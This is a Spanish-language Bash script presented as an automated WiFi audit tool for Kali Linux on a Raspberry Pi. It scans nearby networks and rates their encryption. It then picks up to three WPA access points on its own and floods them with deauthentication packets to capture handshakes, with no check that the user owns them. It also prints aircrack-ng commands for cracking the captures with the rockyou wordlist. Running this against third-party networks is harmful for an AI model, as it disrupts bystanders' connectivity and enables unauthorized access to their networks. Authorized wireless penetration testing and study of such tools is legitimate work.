#!/bin/bash

#=============================================================================
# Script de Auditoría WiFi Automatizada para Raspberry Pi + Kali Linux 2025.3
# Versión: 2.6 FINAL (Completo y Corregido)
# Uso: sudo ./wifi_audit.sh
# Compatible: Alfa AWUS036ACH (RTL8812AU)
#=============================================================================

# Colores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# Variables globales
INTERFACE=""
RESULTS_DIR="wifi_audit_$(date +%Y%m%d_%H%M%S)"
LOG_FILE=""
MONITOR_ACTIVE=false

# RUTAS CORREGIDAS PARA KALI LINUX 2025.3
WORDLIST_DIR="/usr/share/wordlists"
ROCKYOU_PATH="/usr/share/wordlists/rockyou.txt"
SECLISTS_PATH="/usr/share/seclists"
TEMP_DIR="/tmp"

# Binarios de herramientas
AIRCRACK_BIN=""
AIRODUMP_BIN=""
AIREPLAY_BIN=""
AIRMON_BIN=""
WASH_BIN=""

VERSION="2.6"

#=============================================================================
# FUNCIONES AUXILIARES
#=============================================================================

print_banner() {
    clear
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo "║         AUDITORÍA WIFI AUTOMATIZADA - KALI LINUX v${VERSION}        ║"
    echo "║         Raspberry Pi + Alfa AWUS036ACH Edition                ║"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

log_step() {
    local message="$1"
    echo -e "${BLUE}[$(date +%H:%M:%S)]${NC} ${GREEN}➤${NC} $message"
    echo "[$(date +%H:%M:%S)] $message" >> "$LOG_FILE" 2>/dev/null
}

log_error() {
    local message="$1"
    echo -e "${RED}[ERROR]${NC} $message"
    echo "[ERROR] $message" >> "$LOG_FILE" 2>/dev/null
}

log_warning() {
    local message="$1"
    echo -e "${YELLOW}[ADVERTENCIA]${NC} $message"
    echo "[ADVERTENCIA] $message" >> "$LOG_FILE" 2>/dev/null
}

log_success() {
    local message="$1"
    echo -e "${GREEN}[✓]${NC} $message"
    echo "[SUCCESS] $message" >> "$LOG_FILE" 2>/dev/null
}

check_root() {
    if [ "$EUID" -ne 0 ]; then
        log_error "Este script debe ejecutarse como root (sudo)"
        exit 1
    fi
}

locate_binaries() {
    log_step "Localizando binarios de herramientas..."
    
    for path in /usr/bin/aircrack-ng /usr/sbin/aircrack-ng /usr/local/bin/aircrack-ng; do
        if [ -x "$path" ]; then
            AIRCRACK_BIN="$path"
            break
        fi
    done
    [ -z "$AIRCRACK_BIN" ] && AIRCRACK_BIN="aircrack-ng"
    
    for path in /usr/bin/airodump-ng /usr/sbin/airodump-ng /usr/local/bin/airodump-ng; do
        if [ -x "$path" ]; then
            AIRODUMP_BIN="$path"
            break
        fi
    done
    [ -z "$AIRODUMP_BIN" ] && AIRODUMP_BIN="airodump-ng"
    
    for path in /usr/bin/aireplay-ng /usr/sbin/aireplay-ng /usr/local/bin/aireplay-ng; do
        if [ -x "$path" ]; then
            AIREPLAY_BIN="$path"
            break
        fi
    done
    [ -z "$AIREPLAY_BIN" ] && AIREPLAY_BIN="aireplay-ng"
    
    for path in /usr/bin/airmon-ng /usr/sbin/airmon-ng /usr/local/bin/airmon-ng; do
        if [ -x "$path" ]; then
            AIRMON_BIN="$path"
            break
        fi
    done
    [ -z "$AIRMON_BIN" ] && AIRMON_BIN="airmon-ng"
    
    for path in /usr/bin/wash /usr/sbin/wash /usr/local/bin/wash; do
        if [ -x "$path" ]; then
            WASH_BIN="$path"
            break
        fi
    done
    [ -z "$WASH_BIN" ] && WASH_BIN="wash"
    
    log_success "Binarios localizados ✓"
}

check_dependencies() {
    log_step "Verificando dependencias necesarias..."
    
    local deps_commands=("airmon-ng" "airodump-ng" "aireplay-ng" "aircrack-ng" "wash")
    local deps_packages=("aircrack-ng" "reaver" "pixiewps")
    local missing=()
    
    for dep in "${deps_commands[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        log_warning "Faltan comandos: ${missing[*]}"
        log_step "Instalando dependencias faltantes..."
        apt-get update -qq 2>&1 | grep -v "^Reading" || true
        apt-get install -y "${deps_packages[@]}" 2>&1 | grep -v "^Reading" || true
    fi
    
    log_success "Dependencias verificadas ✓"
}

check_wordlists() {
    log_step "Verificando diccionarios disponibles..."
    
    [ ! -d "$WORDLIST_DIR" ] && mkdir -p "$WORDLIST_DIR"
    
    if [ ! -f "$ROCKYOU_PATH" ]; then
        log_warning "rockyou.txt no encontrado en $ROCKYOU_PATH"
        
        if [ -f "${ROCKYOU_PATH}.gz" ]; then
            log_step "Descomprimiendo rockyou.txt.gz..."
            gunzip "${ROCKYOU_PATH}.gz" 2>/dev/null
            log_success "rockyou.txt descomprimido ✓"
        else
            log_step "Instalando paquete wordlists..."
            apt-get install -y wordlists 2>&1 | grep -v "^Reading" || true
            
            if [ -f "${ROCKYOU_PATH}.gz" ]; then
                gunzip "${ROCKYOU_PATH}.gz" 2>/dev/null
            fi
        fi
    fi
    
    if [ -f "$ROCKYOU_PATH" ]; then
        local lines=$(wc -l < "$ROCKYOU_PATH" 2>/dev/null || echo "0")
        log_success "rockyou.txt disponible (${lines} contraseñas)"
    else
        log_warning "rockyou.txt no pudo ser instalado"
    fi
}

detect_wireless_interface() {
    log_step "Detectando interfaces inalámbricas..."
    
    local interfaces=($(iw dev 2>/dev/null | grep Interface | awk '{print $2}'))
    
    if [ ${#interfaces[@]} -eq 0 ]; then
        log_error "No se detectaron interfaces inalámbricas"
        log_warning "Verifica que tu adaptador Alfa AWUS036ACH esté conectado"
        exit 1
    fi
    
    if [ ${#interfaces[@]} -eq 1 ]; then
        INTERFACE="${interfaces[0]}"
        log_step "Interface detectada: $INTERFACE"
    else
        echo -e "\n${CYAN}Interfaces disponibles:${NC}"
        for i in "${!interfaces[@]}"; do
            echo "  [$i] ${interfaces[$i]}"
        done
        read -p "Selecciona la interface [0]: " choice
        choice=${choice:-0}
        INTERFACE="${interfaces[$choice]}"
        log_step "Interface seleccionada: $INTERFACE"
    fi
    
    local driver=$(basename $(readlink -f /sys/class/net/$INTERFACE/device/driver 2>/dev/null) || echo "unknown")
    log_step "Driver: $driver"
    
    local usb_info=$(lsusb | grep -i "0bda:8812" || echo "")
    if [ ! -z "$usb_info" ]; then
        log_success "✓ Alfa AWUS036ACH detectado (RTL8812AU)"
        log_step "Soporte: 2.4GHz + 5GHz | Modo monitor: Completo"
    fi
}

enable_monitor_mode() {
    log_step "Preparando interface para modo monitor..."
    
    log_step "Deteniendo procesos conflictivos..."
    pkill -9 wpa_supplicant 2>/dev/null
    pkill -9 dhclient 2>/dev/null
    systemctl stop NetworkManager 2>/dev/null
    sleep 2
    
    $AIRMON_BIN check kill > /dev/null 2>&1
    sleep 3
    
    log_step "Activando modo monitor en $INTERFACE..."
    local original_interface="$INTERFACE"
    
    $AIRMON_BIN start "$INTERFACE" > /dev/null 2>&1
    sleep 4
    
    local monitor_interface=""
    
    for possible_name in "${original_interface}mon" "${original_interface}" "mon0"; do
        if iw dev "$possible_name" info 2>/dev/null | grep -q "type monitor"; then
            monitor_interface="$possible_name"
            break
        fi
    done
    
    if [ -z "$monitor_interface" ]; then
        monitor_interface=$(iw dev 2>/dev/null | awk '/Interface/ {iface=$2} /type monitor/ {print iface; exit}')
    fi
    
    if [ ! -z "$monitor_interface" ]; then
        INTERFACE="$monitor_interface"
        MONITOR_ACTIVE=true
        
        ip link set "$INTERFACE" down 2>/dev/null
        sleep 1
        iwconfig "$INTERFACE" mode monitor 2>/dev/null
        sleep 1
        ip link set "$INTERFACE" up 2>/dev/null
        sleep 3
        
        if ip link show "$INTERFACE" 2>/dev/null | grep -q "state UP"; then
            log_success "Modo monitor activado en $INTERFACE ✓"
            return 0
        else
            ifconfig "$INTERFACE" up 2>/dev/null
            sleep 2
        fi
    fi
    
    log_warning "Intentando método manual con iw..."
    
    local phy=$(iw dev "$original_interface" info 2>/dev/null | grep wiphy | awk '{print "phy"$2}')
    
    if [ -z "$phy" ]; then
        log_error "No se pudo obtener información del dispositivo"
        exit 1
    fi
    
    ip link set "$original_interface" down 2>/dev/null
    sleep 1
    iw dev "$original_interface" del 2>/dev/null
    sleep 1
    
    local new_mon_name="${original_interface}mon"
    
    if iw "$phy" interface add "$new_mon_name" type monitor 2>/dev/null; then
        sleep 1
        ip link set "$new_mon_name" up 2>/dev/null
        sleep 3
        
        if iw dev "$new_mon_name" info 2>/dev/null | grep -q "type monitor"; then
            INTERFACE="$new_mon_name"
            MONITOR_ACTIVE=true
            log_success "Modo monitor activado en $INTERFACE ✓"
            return 0
        fi
    fi
    
    log_error "FALLO: No se pudo activar modo monitor"
    exit 1
}

scan_networks() {
    log_step "Iniciando escaneo de redes WiFi..."
    
    if [ -z "$INTERFACE" ] || ! iw dev "$INTERFACE" info &>/dev/null; then
        log_error "Interface $INTERFACE no válida"
        return 1
    fi
    
    if ! iw dev "$INTERFACE" info | grep -q "type monitor"; then
        log_error "Interface no está en modo monitor"
        return 1
    fi
    
    local capture_file="$RESULTS_DIR/networks_scan"
    
    log_step "Capturando redes WiFi (30 segundos)..."
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${CYAN}Escaneando 2.4GHz y 5GHz...${NC}\n"
    
    $AIRODUMP_BIN -w "$capture_file" --output-format csv "$INTERFACE" &
    local airodump_pid=$!
    echo $airodump_pid > "${TEMP_DIR}/airodump_scan.pid"
    
    for i in {1..30}; do
        if ! kill -0 $airodump_pid 2>/dev/null; then
            log_warning "airodump-ng terminó inesperadamente"
            break
        fi
        local progress=$((i * 100 / 30))
        echo -ne "\r${BLUE}Progreso: ${GREEN}[$(printf '#%.0s' $(seq 1 $((i*2))))$(printf ' %.0s' $(seq $((i*2)) 59))]${NC} ${progress}% "
        sleep 1
    done
    
    echo -ne "\r$(printf ' %.0s' {1..100})\r"
    
    log_step "Finalizando captura..."
    
    if kill -0 $airodump_pid 2>/dev/null; then
        kill -2 $airodump_pid 2>/dev/null
        sleep 2
        kill -9 $airodump_pid 2>/dev/null
    fi
    
    rm -f "${TEMP_DIR}/airodump_scan.pid"
    pkill -9 airodump-ng 2>/dev/null
    sleep 2
    
    echo ""
    log_success "Captura finalizada"
    
    local csv_file=""
    for pattern in "${capture_file}-01.csv" "${capture_file}.csv"; do
        if [ -f "$pattern" ]; then
            csv_file="$pattern"
            break
        fi
    done
    
    if [ -z "$csv_file" ]; then
        csv_file=$(find "$RESULTS_DIR" -name "*.csv" -type f 2>/dev/null | head -1)
    fi
    
    if [ -z "$csv_file" ] || [ ! -f "$csv_file" ]; then
        log_error "No se generó archivo de captura"
        return 1
    fi
    
    local csv_lines=$(wc -l < "$csv_file" 2>/dev/null || echo "0")
    if [ $csv_lines -lt 3 ]; then
        log_warning "CSV sin datos válidos"
        return 1
    fi
    
    log_step "Archivo CSV: $csv_file (${csv_lines} líneas)"
    
    echo -e "\n${CYAN}╔════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║  BSSID              │ PWR │ CH │ ENC  │ ESSID                          ║${NC}"
    echo -e "${CYAN}╠════════════════════════════════════════════════════════════════════════╣${NC}"
    
    awk -F',' 'NR>2 && NF>13 && $1!="" && $14!="" {
        gsub(/^[ \t]+|[ \t]+$/, "", $1);
        gsub(/^[ \t]+|[ \t]+$/, "", $4);
        gsub(/^[ \t]+|[ \t]+$/, "", $6);
        gsub(/^[ \t]+|[ \t]+$/, "", $9);
        gsub(/^[ \t]+|[ \t]+$/, "", $14);
        if ($1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ && $14 != "") {
            printf "║  %-18s │ %-3s │ %-2s │ %-4s │ %-30s ║\n", $1, $9, $4, $6, substr($14,1,30);
        }
    }' "$csv_file" | head -25
    
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════════════════╝${NC}\n"
    
    awk -F',' 'NR>2 && NF>13 && $1!="" && $14!="" {
        gsub(/^[ \t]+|[ \t]+$/, "", $1);
        if ($1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/) print $0
    }' "$csv_file" > "$RESULTS_DIR/networks_detected.csv"
    
    local count=$(cat "$RESULTS_DIR/networks_detected.csv" 2>/dev/null | wc -l)
    log_success "Total de redes detectadas: $count"
    
    return 0
}

analyze_security() {
    log_step "Analizando seguridad de las redes detectadas..."
    
    if [ ! -f "$RESULTS_DIR/networks_detected.csv" ]; then
        log_error "No hay datos de redes para analizar"
        return 1
    fi
    
    local report="$RESULTS_DIR/security_report.txt"
    
    cat > "$report" << EOF
╔═══════════════════════════════════════════════════════════════╗
║              REPORTE DE SEGURIDAD WIFI                        ║
╚═══════════════════════════════════════════════════════════════╝

Fecha: $(date '+%Y-%m-%d %H:%M:%S')
Interface: $INTERFACE

EOF
    
    local total wep_count wpa_count wpa2_count wpa3_count open_count
    
    total=$(wc -l < "$RESULTS_DIR/networks_detected.csv" 2>/dev/null || echo 0)
    wep_count=$(awk -F',' '{print $6}' "$RESULTS_DIR/networks_detected.csv" | grep -ic "WEP" 2>/dev/null || echo 0)
    wpa_count=$(awk -F',' '{print $6}' "$RESULTS_DIR/networks_detected.csv" | grep -ic "WPA[^2-3]" 2>/dev/null || echo 0)
    wpa2_count=$(awk -F',' '{print $6}' "$RESULTS_DIR/networks_detected.csv" | grep -ic "WPA2" 2>/dev/null || echo 0)
    wpa3_count=$(awk -F',' '{print $6}' "$RESULTS_DIR/networks_detected.csv" | grep -ic "WPA3" 2>/dev/null || echo 0)
    open_count=$(awk -F',' '{print $6}' "$RESULTS_DIR/networks_detected.csv" | grep -ic "OPN" 2>/dev/null || echo 0)
    
       # Limpiar variables y convertir a enteros (sin saltos de línea)
    total=$(echo "$total" | tr -d '\n' | grep -o '[0-9]*' | head -1)
    total=${total:-0}
    
    wep_count=$(echo "$wep_count" | tr -d '\n' | grep -o '[0-9]*' | head -1)
    wep_count=${wep_count:-0}
    
    wpa_count=$(echo "$wpa_count" | tr -d '\n' | grep -o '[0-9]*' | head -1)
    wpa_count=${wpa_count:-0}
    
    wpa2_count=$(echo "$wpa2_count" | tr -d '\n' | grep -o '[0-9]*' | head -1)
    wpa2_count=${wpa2_count:-0}
    
    wpa3_count=$(echo "$wpa3_count" | tr -d '\n' | grep -o '[0-9]*' | head -1)
    wpa3_count=${wpa3_count:-0}
    
    open_count=$(echo "$open_count" | tr -d '\n' | grep -o '[0-9]*' | head -1)
    open_count=${open_count:-0}

    
    cat >> "$report" << EOF
ESTADÍSTICAS GENERALES:
-----------------------
Total de redes: $total

DISTRIBUCIÓN POR ENCRIPTACIÓN:
  🔓 Abiertas: $open_count
  🔴 WEP: $wep_count
  🟠 WPA: $wpa_count
  🟢 WPA2: $wpa2_count
  🟢 WPA3: $wpa3_count

═══════════════════════════════════════════════════════════════

EOF
    
    if [ "$open_count" -gt 0 ]; then
        echo "⚠️  REDES ABIERTAS:" >> "$report"
        awk -F',' '{
            gsub(/^[ \t]+|[ \t]+$/, "", $6);
            gsub(/^[ \t]+|[ \t]+$/, "", $14);
            if ($6 ~ /OPN/ && $14 != "") print "  → " $14
        }' "$RESULTS_DIR/networks_detected.csv" >> "$report"
        echo "" >> "$report"
    fi
    
    if [ "$wep_count" -gt 0 ]; then
        echo "🔴 REDES CON WEP:" >> "$report"
        awk -F',' '{
            gsub(/^[ \t]+|[ \t]+$/, "", $6);
            gsub(/^[ \t]+|[ \t]+$/, "", $14);
            if ($6 ~ /WEP/ && $14 != "") print "  → " $14
        }' "$RESULTS_DIR/networks_detected.csv" >> "$report"
        echo "" >> "$report"
    fi
    
    local risk_score=$((open_count * 10 + wep_count * 8 + wpa_count * 5))
    
    echo "NIVEL DE RIESGO:" >> "$report"
    echo "Puntuación: $risk_score puntos" >> "$report"
    
    if [ "$risk_score" -gt 50 ]; then
        echo "Estado: 🔴 CRÍTICO" >> "$report"
    elif [ "$risk_score" -gt 20 ]; then
        echo "Estado: 🟠 ALTO" >> "$report"
    elif [ "$risk_score" -gt 0 ]; then
        echo "Estado: 🟡 MODERADO" >> "$report"
    else
        echo "Estado: 🟢 BAJO" >> "$report"
    fi
    
    echo "" >> "$report"
    
    cat >> "$report" << EOF
RECOMENDACIONES:
1. Desactivar WPS en todos los routers
2. Migrar redes WEP a WPA2/WPA3
3. Usar contraseñas fuertes (14+ caracteres)
4. Actualizar firmware regularmente

EOF
    
    cat "$report"
    log_success "Reporte guardado: $report"
}

capture_handshakes() {
    log_step "Iniciando captura de handshakes WPA/WPA2..."
    
    if [ ! -f "$RESULTS_DIR/networks_detected.csv" ]; then
        log_warning "No hay datos de redes"
        return 0
    fi
    
    local wpa_count
    wpa_count=$(grep -ic "WPA" "$RESULTS_DIR/networks_detected.csv" 2>/dev/null || echo 0)
    wpa_count=$((wpa_count + 0))
    
    if [ "$wpa_count" -eq 0 ]; then
        log_warning "No hay redes WPA/WPA2"
        return 0
    fi
    
    log_step "Detectadas $wpa_count redes WPA/WPA2"
    mkdir -p "$RESULTS_DIR/handshakes"
    
    local handshake_file="$RESULTS_DIR/handshakes/capture"
    
    log_step "Capturando handshakes (2 minutos)..."
    
    $AIRODUMP_BIN -w "$handshake_file" --output-format pcap,csv "$INTERFACE" &
    local airodump_pid=$!
    echo $airodump_pid > "${TEMP_DIR}/airodump_handshake.pid"
    
    sleep 5
    
    local targets=($(awk -F',' 'NF>13 && $6 ~ /WPA/ {
        gsub(/^[ \t]+|[ \t]+$/, "", $1);
        gsub(/^[ \t]+|[ \t]+$/, "", $4);
        if ($1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/)
            print $1":"$4
    }' "$RESULTS_DIR/networks_detected.csv" | head -3))
    
        if [ ${#targets[@]} -gt 0 ]; then
        log_step "Enviando deauth a ${#targets[@]} redes..."
        echo ""
        
        for target_info in "${targets[@]}"; do
            IFS=':' read -r b1 b2 b3 b4 b5 b6 channel <<< "$target_info"
            local bssid="${b1}:${b2}:${b3}:${b4}:${b5}:${b6}"
            
            if [ ! -z "$bssid" ]; then
                echo -e "${CYAN}╔════════════════════════════════════════════════════════╗${NC}"
                echo -e "${CYAN}║ Target: $bssid ${NC}"
                echo -e "${CYAN}║ Canal: ${channel:-desconocido} ${NC}"
                echo -e "${CYAN}╚════════════════════════════════════════════════════════╝${NC}"
                
                # Cambiar canal si está disponible
                if [ ! -z "$channel" ]; then
                    iwconfig "$INTERFACE" channel "$channel" 2>/dev/null
                    sleep 1
                fi
                
                # Test de inyección primero
                log_step "Probando inyección de paquetes..."
                $AIREPLAY_BIN --test "$INTERFACE" 2>&1 | grep -i "injection\|working" | head -3
                
                echo ""
                log_step "Enviando deauth (verás el output en tiempo real):"
                
                # Ejecutar con output visible
                $AIREPLAY_BIN --deauth 50 -a "$bssid" "$INTERFACE" 2>&1 | while IFS= read -r line; do
                    echo "  $line"
                done &
                
                local deauth_pid=$!
                
                # Dejar correr 15 segundos
                sleep 15
                
                # Matar el proceso
                kill -9 $deauth_pid 2>/dev/null
                pkill -9 aireplay-ng 2>/dev/null
                
                echo ""
                log_success "Deauth finalizado para $bssid"
                echo ""
                
                sleep 10
            fi
        done
        
        sleep 30
    else
        log_warning "No hay targets WPA disponibles"
        sleep 120
    fi

    
    log_step "Finalizando captura..."
    
    if kill -0 $airodump_pid 2>/dev/null; then
        kill -2 $airodump_pid 2>/dev/null
        sleep 2
        kill -9 $airodump_pid 2>/dev/null
    fi
    
    rm -f "${TEMP_DIR}/airodump_handshake.pid"
    pkill -9 airodump-ng aireplay-ng 2>/dev/null
    sleep 2
    
    echo ""
    
        if [ -f "${handshake_file}-01.cap" ]; then
        local filesize=$(stat -c%s "${handshake_file}-01.cap" 2>/dev/null || echo 0)
        log_step "Archivo capturado: $(numfmt --to=iec $filesize 2>/dev/null || echo "${filesize} bytes")"
        
        if [ "$filesize" -lt 1000 ]; then
            log_warning "Archivo muy pequeño ($filesize bytes) - Sin datos útiles"
            return 0
        fi
        
        log_step "Verificando handshakes (debería tomar 1-8 segundos)..."
        
        local verification_start=$(date +%s)
        
        # Ejecutar aircrack-ng en segundo plano con límite de tiempo manual
        $AIRCRACK_BIN "${handshake_file}-01.cap" > "${TEMP_DIR}/aircrack_output.txt" 2>&1 &
        local aircrack_pid=$!
        
        # Esperar máximo 30 segundos
        local elapsed=0
        while [ $elapsed -lt 30 ]; do
            if ! kill -0 $aircrack_pid 2>/dev/null; then
                # Proceso terminó normalmente
                break
            fi
            
            # Mostrar progreso cada segundo
            echo -ne "\r${BLUE}Verificando... ${elapsed}s${NC}"
            sleep 1
            ((elapsed++))
        done
        
        # Si aún está corriendo después de 30s, matarlo
        if kill -0 $aircrack_pid 2>/dev/null; then
            log_error "\nVerificación excedió 30 segundos - Terminando proceso"
            kill -9 $aircrack_pid 2>/dev/null
            pkill -9 aircrack-ng 2>/dev/null
            rm -f "${TEMP_DIR}/aircrack_output.txt"
            log_warning "El archivo puede estar corrupto o ser demasiado grande"
            return 0
        fi
        
        # Leer resultado
        local handshake_output=$(cat "${TEMP_DIR}/aircrack_output.txt" 2>/dev/null || echo "")
        rm -f "${TEMP_DIR}/aircrack_output.txt"
        
        local verification_end=$(date +%s)
        local verification_time=$((verification_end - verification_start))
        
        echo -ne "\r$(printf ' %.0s' {1..80})\r"
        log_step "Verificación completada en ${verification_time}s"
        
        local handshake_count=$(echo "$handshake_output" | grep -c "handshake" || echo 0)
        
        if [ "$handshake_count" -gt 0 ]; then
            log_success "✓ Handshakes capturados: $handshake_count"
            
            cat > "$RESULTS_DIR/handshakes/README.txt" << EOF
HANDSHAKES CAPTURADOS
=====================
Tiempo de verificación: ${verification_time}s
Tamaño del archivo: $(numfmt --to=iec $filesize 2>/dev/null || echo "${filesize} bytes")

DETALLES:
$(echo "$handshake_output" | grep -A 2 "WPA")

Para crackear:
$AIRCRACK_BIN ${handshake_file}-01.cap -w $ROCKYOU_PATH
EOF
            
            log_step "Para crackear ejecuta:"
            echo "  cd $RESULTS_DIR/handshakes"
            echo "  $AIRCRACK_BIN capture-01.cap -w $ROCKYOU_PATH"
        else
            log_warning "No se capturaron handshakes válidos"
            echo ""
            log_step "Razones posibles:"
            echo "  • No hubo clientes conectados durante la captura"
            echo "  • Los paquetes deauth no llegaron"
            echo "  • Handshake incompleto (solo 2 o 3 de 4 paquetes EAPOL)"
            echo "  • Señal WiFi muy débil"
        fi
        
        if [ "$verification_time" -gt 15 ]; then
            echo ""
            log_warning "Verificación lenta (${verification_time}s)"
            log_step "Para optimizar:"
            echo "  • Reducir tiempo de captura a 60-90 segundos"
            echo "  • Limpiar archivos .cap viejos: rm -f $RESULTS_DIR/handshakes/*.cap"
        fi
    else
        log_warning "No se generó archivo .cap"
    fi

}


test_wps_vulnerability() {
    log_step "Escaneando vulnerabilidades WPS (60 segundos)..."
    
    local wps_scan="$RESULTS_DIR/wps_scan.txt"
    
    $WASH_BIN -i "$INTERFACE" &
    local wash_pid=$!
    
    for i in {1..60}; do
        if ! kill -0 $wash_pid 2>/dev/null; then
            break
        fi
        if [ $((i % 10)) -eq 0 ]; then
            echo -ne "\r${BLUE}Escaneando: ${i}s / 60s${NC}"
        fi
        sleep 1
    done
    
    echo -ne "\r$(printf ' %.0s' {1..50})\r"
    
    if kill -0 $wash_pid 2>/dev/null; then
        kill -2 $wash_pid 2>/dev/null
        sleep 2
        kill -9 $wash_pid 2>/dev/null
    fi
    
    pkill -9 wash 2>/dev/null
    sleep 2
    
    $WASH_BIN -i "$INTERFACE" 2>&1 | head -50 | tee "$wps_scan" &
    local temp_pid=$!
    sleep 15
    kill -9 $temp_pid 2>/dev/null
    
    echo ""
    
    if [ ! -s "$wps_scan" ]; then
        log_warning "No se detectaron redes con WPS"
        return 0
    fi
    
    local wps_count=$(grep -cE "^[0-9A-Fa-f]{2}:" "$wps_scan" || echo 0)
    
    if [ "$wps_count" -gt 0 ]; then
        log_success "✓ Detectadas $wps_count redes con WPS"
        echo ""
        grep -E "^[0-9A-Fa-f]{2}:" "$wps_scan"
    else
        log_step "No hay redes con WPS habilitado"
    fi
}

generate_final_report() {
    log_step "Generando reporte final..."
    
    local final_report="$RESULTS_DIR/REPORTE_FINAL.txt"
    
    cat > "$final_report" << EOF
╔═══════════════════════════════════════════════════════════════╗
║           REPORTE FINAL - AUDITORÍA WIFI v${VERSION}                 ║
╚═══════════════════════════════════════════════════════════════╝

Fecha: $(date)
Interface: $INTERFACE
Directorio: $RESULTS_DIR

ARCHIVOS GENERADOS:
-------------------
EOF
    
    find "$RESULTS_DIR" -type f | while read file; do
        local name=$(basename "$file")
        echo "  - $name" >> "$final_report"
    done
    
    cat >> "$final_report" << EOF

RECOMENDACIONES PRIORITARIAS:
------------------------------
1. Desactivar WPS en todos los routers
2. Migrar redes WEP a WPA2/WPA3 inmediatamente
3. Usar contraseñas robustas (14+ caracteres)
4. Actualizar firmware regularmente

PARA CRACKEAR HANDSHAKES:
--------------------------
$AIRCRACK_BIN $RESULTS_DIR/handshakes/capture-01.cap -w $ROCKYOU_PATH

EOF
    
    cat "$final_report"
    log_success "Reporte final: $final_report"
}

cleanup() {
    log_step "Ejecutando limpieza..."
    
    pkill -9 aireplay-ng airodump-ng wash 2>/dev/null
    
    rm -f "${TEMP_DIR}/airodump_scan.pid" 2>/dev/null
    rm -f "${TEMP_DIR}/airodump_handshake.pid" 2>/dev/null
    
    sleep 3
    
    if [ "$MONITOR_ACTIVE" = true ] && [ ! -z "$INTERFACE" ]; then
        log_step "Desactivando modo monitor..."
        $AIRMON_BIN stop "$INTERFACE" > /dev/null 2>&1
        sleep 2
    fi
    
    systemctl start NetworkManager 2>/dev/null
    sleep 2
    
    log_success "Limpieza completada ✓"
}

#=============================================================================
# MAIN
#=============================================================================

main() {
    print_banner
    
    check_root
    
    mkdir -p "$RESULTS_DIR"
    LOG_FILE="$RESULTS_DIR/audit.log"
    
    log_step "WiFi Audit Tool v${VERSION}"
    log_step "Resultados en: $RESULTS_DIR"
    echo ""
    
    locate_binaries
    check_dependencies
    check_wordlists
    echo ""
    
    detect_wireless_interface
    echo ""
    
    enable_monitor_mode
    echo ""
    
    scan_networks || { cleanup; exit 1; }
    echo ""
    
    analyze_security
    echo ""
    
    test_wps_vulnerability
    echo ""
    
    capture_handshakes
    echo ""
    
    generate_final_report
    echo ""
    
    cleanup
    
    echo -e "\n${GREEN}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║         ✓ AUDITORÍA COMPLETADA EXITOSAMENTE                   ║${NC}"
    echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
    
    log_success "Ver: $RESULTS_DIR/REPORTE_FINAL.txt"
}

trap cleanup EXIT INT TERM

main "$@"

